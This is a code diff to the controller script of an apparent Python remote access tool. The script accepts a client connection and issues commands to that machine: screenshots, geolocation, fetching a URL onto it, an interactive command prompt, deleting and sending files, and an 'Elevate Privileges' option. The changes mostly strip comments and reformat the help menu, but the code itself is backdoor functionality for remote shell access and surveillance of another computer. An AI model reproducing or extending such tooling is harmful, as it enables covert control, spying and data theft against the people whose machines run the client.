@@ -36,14 +36,11 @@ print("[+] LPORT = ", port)
 print("[+] Waiting for incomming connections")
 s.listen(1) #Change 1 for multiple connections
 conn, addr = s.accept()
+
 print("[+] ", addr, "has connected to the server successfully")
+print("")
 
-#Get username from the client
 username = conn.recv(10000000)
-
-
-
-
 
 def main():
 
@@ -95,18 +92,16 @@ def main():
     def screenshot():
         conn.send(command.encode())
         print("Taking screenshot of client")
-        screenshot_data = conn.recv(1000000) # Receive the image
+        screenshot_data = conn.recv(1000000)
         time = datetime.datetime.now()
         screenshot_name = "Screenshot" + time.strftime("%y-%m-%H-%M-%S") + ".png"
-        screenshot_file = open(screenshot_name, "wb+") # Open the screenshot_file in write bytes mode
-        screenshot_file.write(screenshot_data) #Write the screenshot_data to the screenshot_file
-        screenshot_file.close() # Save the screenshot_file
-        print("File has been saved and is ready to be opened")
+        screenshot_file = open(screenshot_name, "wb+")
+        screenshot_file.write(screenshot_data)
+        screenshot_file.close()
         print("Image path: ", os.path.abspath(screenshot_name))
 
     def geolocate():
         conn.send(command.encode())
-        print("Geolocating client...")
         geolocation = conn.recv(5000)
         geolocation = geolocation.decode()
         geolocation_coordinates = conn.recv(5000)
@@ -116,12 +111,12 @@ def main():
         print(geolocation)
 
     def download_url():
-        conn.send(command.lower().encode())
-        url = str(input("Please enter a URL to download: "))
+        conn.send(command.encode())
+        url = str(input("Download URL: "))
         conn.send(url.encode())
-        filename = str(input("Please enter a filename: "))
+        filename = str(input("Filename: "))
         conn.send(filename.encode())
-        print("Send everything to the client... It should work now (:")
+        print("[+] Downloading file")
     
     def cmd(): # Interact with the command prompt
         conn.send(command.encode())
@@ -135,39 +130,25 @@ def main():
 
                 client_response = client_response.replace('Den angivne sti blev ikke fundet.', "") # Gets rid of false errors
                 print(client_response, end="")
-    
-    
-
-
-
-        """
-        cmd_command = str(input("=> "))
-        print("Sending cmd_command to the client...")
-        conn.send(cmd_command.encode())
-        print("Sent cmd_command to the client...")
-        output = conn.recv(1000).decode()
-        print("Received cmd_command from the client... Printing it...")
-        print(output)
-        """
 
     def get_admin():
         conn.send(command.encode())
         
-        
- 
     def get_help():
         print("")
         print("List of commands")
-        print("FOLDER STUFF")
-        print("pwd - print working directory")
-        print("custom_dir - show what is in a folder")
-        print("download_file - download a file and save it on the server")
-        print("remove_file - delete a file from the client")
-        print("send_file - send a file to the client")
         print("")
-        print("OTHER")
-        print("geolocate - get latitude and longtitude of the client")
-        print("screenshot - make a screenshot of the client (Not working yet)")
+        print("pwd           -      Print Working Directory")
+        print("custom_dir    -      Custom Directory       ")
+        print("download_file -      Download File          ")
+        print("remove_file   -      Delete File            ")
+        print("send_file -   -      Send File              ")
+        print("")
+        print("geolocate     -      Geolocate              ")
+        print("screenshot    -      Screenshot             ")
+        print("cmd           -      CMD                    ")
+        print("get_admin     -      Elevate Privileges     ")
+        print("help     -           Get Help     ")
         print("")
 
     def error(error_msg):
